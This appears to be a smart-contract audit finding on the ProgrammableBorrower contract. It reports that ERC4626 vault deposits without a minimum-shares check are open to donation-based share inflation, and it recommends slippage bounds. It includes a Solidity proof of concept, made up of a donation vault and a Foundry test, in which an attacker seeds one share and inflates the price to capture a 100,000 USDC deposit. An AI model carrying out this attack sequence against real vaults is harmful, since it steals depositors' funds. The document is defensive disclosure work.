### Title
Unbounded ERC4626 deposits allow donation-based share inflation - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` deploys idle underlying into an asset-compatible ERC4626 vault through `vault.deposit`, but never enforces a minimum number of minted shares. [1](#0-0)  An unprivileged vault user can seed a new vault with one share, inflate its share price through a counted asset donation, and cause the borrower’s subsequent deposit to mint zero shares. 

### Finding Description
Both initialization and `setVault` accept any ERC4626 vault whose `asset()` matches the underlying token; neither path requires existing supply, minimum liquidity, virtual shares, or a minimum exchange-rate invariant. [2](#0-1) [3](#0-2) 

During epoch startup, the contract snapshots its current position, sends the full idle token balance to `_depositToVault`, and marks epoch accounting active. [4](#0-3)  `_depositToVault` accepts whatever share amount the external vault returns, including zero. [5](#0-4)  Active-epoch borrower repayments take the same unbounded deposit path. [6](#0-5) 

The attacker seeds the external vault with one share and donates enough underlying for the vault’s donation-counted `totalAssets` to exceed the borrower’s upcoming deposit.  For a deposit `B`, a preexisting `totalAssets > B` makes `B * totalSupply / totalAssets` round to zero shares while the vault retains the deposited assets.  `_currentVaultAssets()` then reports zero because the borrower owns zero shares, even though its deposit remains inside the external vault and is redeemable by the attacker’s sole share. [7](#0-6) 

A deadline is not the operative control because the deposit itself is atomic; the missing control is an output bound on minted ERC4626 shares. [1](#0-0) 

### Impact Explanation
For a `100,000 USDC` deposit, the attacker spends approximately `100,002 USDC` on the initial deposit and donation, then redeems approximately `200,002 USDC`, for a profit of approximately `100,000 USDC`.  The borrower loses the deposited principal because it received no vault shares, while the attacker can redeem all assets held by the vault. [7](#0-6)  The loss is borne by tranche holders through the programmable borrower’s vault-loss accounting rather than being isolated from lender funds. [8](#0-7) 

### Likelihood Explanation
Likelihood is conditional rather than universal: the configured ERC4626 must have very small supply and an asset valuation that counts direct-token donations, and the borrower must not already hold shares.  Those conditions are realistically available when management configures a newly deployed or nearly empty vault, because `setVault` validates only the asset and the absence of a prior borrower position. [3](#0-2)  Deep, established vaults such as populated Morpho vaults generally do not expose this exact donation-profit path, which limits practical severity to a medium finding. [9](#0-8) 

### Recommendation
Enforce an execution-time output bound around every external vault deposit. [5](#0-4) 

```solidity
uint256 expectedShares = vault.convertToShares(_assetAmount);
uint256 minShares = expectedShares * (BASIS - maxDepositSlippageBps) / BASIS;
uint256 shares = vault.deposit(_assetAmount, address(this));
if (shares < minShares || shares == 0) revert InvalidAmount();
```

Management should also reject empty or economically immaterial vaults during initialization and `setVault`, ideally requiring an existing minimum supply and asset balance. [10](#0-9)  Where migration is required, withdraw any newly received dust shares or verify the observed exchange rate before activating epoch accounting. [4](#0-3)

```solidity
contract DonationVault is ERC20 {
  IERC20Detailed public immutable assetToken;

  constructor(address _asset) ERC20("Donation Vault", "DV") {
    assetToken = IERC20Detailed(_asset);
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function totalAssets() public view returns (uint256) {
    return assetToken.balanceOf(address(this));
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    return supply == 0 ? shares : shares * totalAssets() / supply;
  }

  function convertToShares(uint256 assets) public view returns (uint256) {
    uint256 supply = totalSupply();
    uint256 managed = totalAssets();
    return supply == 0 || managed == 0 ? assets : assets * supply / managed;
  }

  function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    shares = convertToShares(assets);
    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares) {
    uint256 supply = totalSupply();
    shares = (assets * supply + totalAssets() - 1) / totalAssets();
    if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }

  function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
    assets = convertToAssets(shares);
    if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }

  function maxWithdraw(address owner) external view returns (uint256) {
    return convertToAssets(balanceOf(owner));
  }
}
```

```solidity
function testProgrammableVaultDepositCanMintZeroShares() external {
  uint256 amount = 100_000 * oneScale;
  address attacker = makeAddr("vault-attacker");
  DonationVault donationVault = new DonationVault(USDC);

  // Honest manager selects an empty but asset-compatible ERC4626 vault.
  vm.prank(manager);
  programmableBorrower.setVault(address(donationVault));

  deal(USDC, attacker, amount + 2, true);
  vm.startPrank(attacker);
  underlying.approve(address(donationVault), 1);

  // Seed one share, then inflate price so `amount` mints zero shares.
  donationVault.deposit(1, attacker);
  underlying.transfer(address(donationVault), amount + 1);
  vm.stopPrank();

  idleCDO.depositAA(amount);

  vm.prank(manager);
  cdoEpoch.startEpoch();

  assertEq(
    donationVault.balanceOf(address(programmableBorrower)),
    0,
    "borrower deposit minted zero shares"
  );
  assertEq(programmableBorrower.vaultLoss(), amount, "deposit was not recorded as vault loss");

  uint256 attackerBefore = underlying.balanceOf(attacker);
  vm.prank(attacker);
  uint256 redeemed = donationVault.redeem(1, attacker, attacker);

  assertEq(redeemed, 2 * amount + 2, "attacker did not receive all vault assets");
  assertEq(
    underlying.balanceOf(attacker) - attackerBefore,
    2 * amount + 2,
    "attacker redemption failed"
  );
  assertApproxEqAbs(
    redeemed - (amount + 2),
    amount,
    2,
    "unexpected profit amount"
  );
}
```
